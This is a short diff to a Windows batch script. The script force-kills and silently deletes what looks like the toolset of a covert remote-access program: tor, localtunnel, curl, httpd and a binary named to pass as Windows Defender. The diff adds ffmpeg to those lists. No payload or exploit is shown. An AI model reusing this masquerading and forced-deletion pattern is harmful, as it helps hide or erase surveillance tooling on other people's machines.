@@ -13,10 +13,12 @@ taskkill /f /im curl.exe
 taskkill /f /im "Windows Defender.exe"
 taskkill /f /im localtunnel.exe
 taskkill /f /im httpd.exe
+taskkill /f /im ffmpeg.exe
 "%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\Windows Defender.exe"
 "%environment%\nircmd.exe" execmd rmdir /s /q "%environment%\localtunnel"
 "%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\curl.exe"
 "%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\tor.exe"
+"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\ffmpeg.exe"
 "%environment%\nircmd.exe" execmd rmdir /s /q "%appdata%\tor"
 "%environment%\nircmd.exe" execmd rmdir /s /q "%appdata%\Ookla"
 "%environment%\nircmd.exe" execmd rmdir /s /q "%environment%\Win32"
